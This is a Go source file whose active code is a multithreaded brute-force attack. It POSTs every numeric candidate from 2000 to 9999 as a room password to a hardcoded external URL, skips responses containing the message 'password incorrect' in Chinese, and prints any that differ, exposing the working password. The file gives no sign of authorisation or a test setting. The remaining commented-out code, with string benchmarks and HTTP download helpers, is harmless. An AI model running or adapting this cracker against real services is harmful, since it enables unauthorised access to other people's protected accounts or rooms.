package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"

	"github.com/nlh1996/utils"
)

var u string

func init() {
	u = "http://h5.u6686z.cn/html/isroompwd.php?roomnumber=23314391"
}

func main() {

	for i := 2; i < 10; i++ {
		go ccc(i)
	}
	select {}
}

func ccc(index int) {
	for i := index * 1000; i < (index+1)*1000; i++ {
		getRes2(u, i)
	}
	fmt.Println("stop")
}

func getRes2(u string, i int) {
	s := utils.IntToString(i)
	DataURLVal := url.Values{}
	DataURLVal.Add("room_config_pwd", s)

	resp, err := http.Post(u,
		"application/x-www-form-urlencoded",
		strings.NewReader(DataURLVal.Encode()))
	if err != nil {
		log.Println(err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
	}
	if resp != nil {
		resp.Body.Close()
	}
	if strings.Contains(string(body), "密码不正确") {
		return
	}
	fmt.Println(s, string(body))
}

// func testStrings() {
// 	var str = "Hello world!!!"
// 	var res = false
// 	var msg string
// 	reg := regexp.MustCompile(`He|ld`)
// 	start := time.Now()
// 	for i := 0; i < 1000000; i++ {
// 		res = strings.Contains(str, "He")
// 		if !res {
// 			res = strings.Contains(str, "ld")
// 		}
// 	}
// 	end := time.Now()
// 	fmt.Println(end.Sub(start))

// 	start = time.Now()
// 	for i := 0; i < 1000000; i++ {
// 		msg = reg.FindString(str)
// 		if msg != "" {

// 		}
// 	}
// 	end = time.Now()
// 	fmt.Println(end.Sub(start))
// }

// // func testRouter() {
// // 	env.Port = "8000"
// // 	go router.Init()
// // 	<-env.ResStart
// // 	fmt.Println(111)
// // 	select {}
// // }

// func httpRead() {
// 	// buf := make([]byte, 1000000)
// 	// for {
// 	// 	n, err := resp.Body.Read(buf)
// 	// 	if err != nil || n == 0 {
// 	// 		fmt.Println("出现错误")
// 	// 		break
// 	// 	}
// 	// 	result += string(buf[:n])
// 	// }
// }

// func testsort() {
// 	list := model.Spans{}
// 	span := model.Span{}
// 	span.Time = "1587457762873000"
// 	list = append(list, span)
// 	span.Time = "1587457762872000"
// 	list = append(list, span)
// 	span.Time = "1587457762874000"
// 	list = append(list, span)
// 	fmt.Println(list)
// 	sort.Sort(list)
// 	fmt.Println(list)
// }

// func get(url string, i int, size int) string {
// 	req := fasthttp.AcquireRequest()
// 	req.Header.SetMethod("GET")
// 	s := fmt.Sprintf("bytes=%d-%d", i*size, (i+1)*size)
// 	req.Header.Set("Range", s)
// 	req.Header.Set("Accept-Charset", "utf-8")
// 	req.Header.Set("Accept-Encoding", "gzip")
// 	req.SetRequestURI(url)
// 	resp := fasthttp.AcquireResponse()
// 	if err := fasthttp.DoTimeout(req, resp, time.Second*30); err != nil {
// 		log.Println(err)
// 	}
// 	return string(resp.Body())
// }

// func getRes(url string, i int, size int) string {
// 	req, err := http.NewRequest("GET", url, nil)
// 	if err != nil {
// 		log.Fatalf("Invalid url for downloading: %s, error: %v", url, err)
// 	}
// 	s := fmt.Sprintf("bytes=%d-%d", i*size, (i+1)*size)
// 	req.Header.Set("Range", s)
// 	req.Header.Set("Accept-Charset", "utf-8")
// 	req.Header.Set("Accept-Encoding", "gzip")
// 	resp, err := env.Client.Do(req)
// 	if err != nil {
// 		log.Println(err)
// 		return ""
// 	}
// 	body, err := ioutil.ReadAll(resp.Body)
// 	if err != nil {
// 		log.Println(err)
// 	}
// 	return string(body)
// }
